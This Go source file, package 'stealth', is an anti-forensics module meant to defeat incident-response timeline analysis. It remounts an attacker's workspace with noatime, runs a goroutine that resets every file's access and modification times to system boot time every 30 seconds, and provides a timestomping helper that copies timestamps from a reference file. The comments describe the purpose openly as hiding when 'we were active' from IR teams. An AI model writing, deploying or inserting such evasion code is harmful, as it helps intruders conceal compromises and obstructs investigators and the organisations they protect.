package stealth

import (
	"os"
	"path/filepath"
	"syscall"
	"time"
)

// tmpfs Timestamp Freezing
//
// OPSEC rationale: IR teams use timeline analysis (fls, mactime, find -newer)
// to reconstruct activity. Files in our workspace have creation/modification
// timestamps that reveal when we were active. By mounting with noatime and
// periodically resetting timestamps to a fixed point, timeline analysis
// shows nothing useful.

// TimestampFreezeConfig controls timestamp manipulation.
type TimestampFreezeConfig struct {
	WorkspacePath string
	FreezeTime    time.Time     // timestamp to freeze to
	Interval      time.Duration // how often to reset
	done          chan struct{}
}

// DefaultFreezeConfig returns a config that freezes timestamps to the
// system boot time — files appear to have been created at boot.
func DefaultFreezeConfig(workspacePath string) *TimestampFreezeConfig {
	return &TimestampFreezeConfig{
		WorkspacePath: workspacePath,
		FreezeTime:    getBootTime(),
		Interval:      30 * time.Second,
		done:          make(chan struct{}),
	}
}

// MountNoatime remounts the workspace with noatime and nodiratime flags.
// This prevents the kernel from updating access times on reads.
func MountNoatime(path string) error {
	return syscall.Mount("", path, "", syscall.MS_REMOUNT|syscall.MS_NOATIME|syscall.MS_NODIRATIME, "")
}

// FreezeTimestamps sets all files in a directory to the frozen timestamp.
func FreezeTimestamps(dir string, freezeTime time.Time) error {
	ts := syscall.NsecToTimeval(freezeTime.UnixNano())
	timeval := [2]syscall.Timeval{ts, ts} // atime, mtime

	return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // skip errors
		}
		// Use Utimes to set both atime and mtime
		syscall.Utimes(path, timeval[:])
		return nil
	})
}

// StartTimestampFreezer starts a goroutine that periodically resets timestamps.
func StartTimestampFreezer(cfg *TimestampFreezeConfig) {
	// Initial freeze
	MountNoatime(cfg.WorkspacePath)
	FreezeTimestamps(cfg.WorkspacePath, cfg.FreezeTime)

	go func() {
		ticker := time.NewTicker(cfg.Interval)
		defer ticker.Stop()

		for {
			select {
			case <-cfg.done:
				return
			case <-ticker.C:
				FreezeTimestamps(cfg.WorkspacePath, cfg.FreezeTime)
			}
		}
	}()
}

// StopTimestampFreezer stops the periodic freezing.
func StopTimestampFreezer(cfg *TimestampFreezeConfig) {
	select {
	case <-cfg.done:
	default:
		close(cfg.done)
	}
}

// FreezeFileTimestamp sets a single file's timestamps to match a reference file.
// Useful for timestomping individual artifacts.
func FreezeFileTimestamp(targetPath string, referencePath string) error {
	refInfo, err := os.Stat(referencePath)
	if err != nil {
		return err
	}

	refTime := refInfo.ModTime()
	ts := syscall.NsecToTimeval(refTime.UnixNano())
	timeval := [2]syscall.Timeval{ts, ts}

	return syscall.Utimes(targetPath, timeval[:])
}

// getBootTime reads system boot time from /proc/stat.
func getBootTime() time.Time {
	data, err := os.ReadFile("/proc/stat")
	if err != nil {
		return time.Now().Add(-24 * time.Hour) // fallback: 24h ago
	}

	// Look for "btime <epoch>" line
	content := string(data)
	for i := 0; i < len(content); i++ {
		if i+5 < len(content) && content[i:i+5] == "btime" {
			// Parse the epoch timestamp
			j := i + 6 // skip "btime "
			for j < len(content) && content[j] == ' ' {
				j++
			}
			epoch := int64(0)
			for j < len(content) && content[j] >= '0' && content[j] <= '9' {
				epoch = epoch*10 + int64(content[j]-'0')
				j++
			}
			if epoch > 0 {
				return time.Unix(epoch, 0)
			}
		}
	}

	return time.Now().Add(-24 * time.Hour)
}
